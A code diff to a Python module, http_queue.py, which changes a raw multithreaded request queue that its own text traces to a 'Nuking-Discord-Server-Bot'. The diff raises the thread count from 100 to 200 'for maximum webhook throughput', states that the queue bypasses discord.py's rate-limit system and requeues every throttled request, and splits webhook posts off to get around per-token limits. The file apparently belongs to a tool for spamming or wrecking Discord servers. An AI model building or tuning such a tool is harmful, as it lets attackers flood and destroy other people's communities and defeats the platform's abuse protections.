@@ -1,15 +1,13 @@
 """
-http_queue.py — LAST STAND | 100-thread raw HTTP request queue.
-Directly ported from c-realV2.py by TKperson (Nuking-Discord-Server-Bot).
+http_queue.py — THE EONIZER | 200-thread raw HTTP request queue.
 
 Architecture:
-  100 daemon threads pull (method, url, payload, use_auth) from an unbounded Queue.
+  200 daemon threads pull (method, url, payload, use_auth) from an unbounded Queue.
   Each thread fires the request directly to Discord's REST API via `requests`,
   completely bypassing discord.py's internal rate-limit bucket system.
 
   429 handling: sleep min(retry_after, 5s) then always requeue — requests are never
-  dropped. The 5s sleep cap prevents thread starvation (100 threads × 30s = full stall).
-  If the bucket is longer than 5s, the request will retry on the next pick-up cycle.
+  dropped. The 5s sleep cap prevents thread starvation.
   Stop: call clear() to drain pending items instantly.
 
   All q.put() calls are non-blocking (unbounded queue).
@@ -26,7 +24,7 @@ from threading import Thread
 import requests
 
 API_BASE        = "https://discord.com/api/v10"
-CONCURRENT      = 100
+CONCURRENT      = 200   # doubled from 100 for maximum webhook throughput
 MAX_RETRY_SLEEP = 5.0
 
 
@@ -50,7 +48,7 @@ class HttpQueue:
             method, url, payload, use_auth = self._q.get()
             try:
                 headers = self._auth_headers if use_auth else self._wh_headers
-                kwargs: dict = {"headers": headers, "timeout": 6}
+                kwargs: dict = {"headers": headers, "timeout": 8}
                 if payload is not None:
                     kwargs["data"] = json.dumps(payload)
                 r = method(url, **kwargs)
@@ -74,7 +72,7 @@ class HttpQueue:
         self._q.put((method, url, payload, True))
 
     def put_webhook(self, url: str, payload: dict) -> None:
-        """Queue a webhook POST (no Authorization header needed)."""
+        """Queue a webhook POST (no Authorization header — separate rate limit from bot token)."""
         self._q.put((requests.post, url, payload, False))
 
     def clear(self) -> None:
